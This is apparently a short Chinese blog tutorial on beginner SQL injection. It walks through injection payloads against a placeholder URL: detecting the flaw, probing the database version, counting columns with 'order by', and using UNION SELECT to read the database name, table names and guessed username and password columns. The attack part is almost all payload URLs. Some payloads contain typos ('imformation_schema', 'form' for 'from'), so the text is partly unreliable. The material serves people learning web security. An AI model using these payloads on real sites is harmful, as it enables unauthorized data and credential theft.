---
title: sql注入初段
date: 2020-04-11 22:39:10
tags: sql注入
---

# sql注入初级阶段
## 一、判断是否存在注入
```
http://xxxx/index.php?id=1'

http://xxxx/index.php?id=1 and 1=2
```
页面错误则存在.相当于sql语句的`select * from 表名 where id =1 and 1=1; `

## 二、数据库爆破

判断数据库类型以及版本
```
http://xxxx/index.php?id=1 and ord(mid(version(),1,1))>51 
```
## 三、字段爆破
猜测数据注入的位置
```
http://xxxx/index.php?id=1 order by 一个数
```
如果这个数刚好返回正确的页面，说明字段就是这个数

## 四、数据库数据表爆破
构造联合查询语句(union select)
```
http://xxxx/index.php?id=1 and 1=2 union select 1,2
```
如果是返回的数字2，这个数字指的是我们可以把联合查询的对应位置替换为想要查询的关键字

这时，查询数据库版本
```
http://xxxx/index.php?id=1 and 1=2 union select 1,version()
```
## 五、用户名、密码爆破
使用第四步，查看数据库名称，构造如下
```
http://xxxx/index.php?id=1 and 1=2 union select 1,database()
```
同理，查看当前表名
```
http://xxxx/index.php?id=1 and 1=2 union select 1,table_name from imformation_schema.tables where table_schema='数据库名'

```
同理，猜测字段并得到相应的结果
```
http://xxxx/index.php?id=1 and 1=2 union select 1,猜测的字段名 form 表名
```
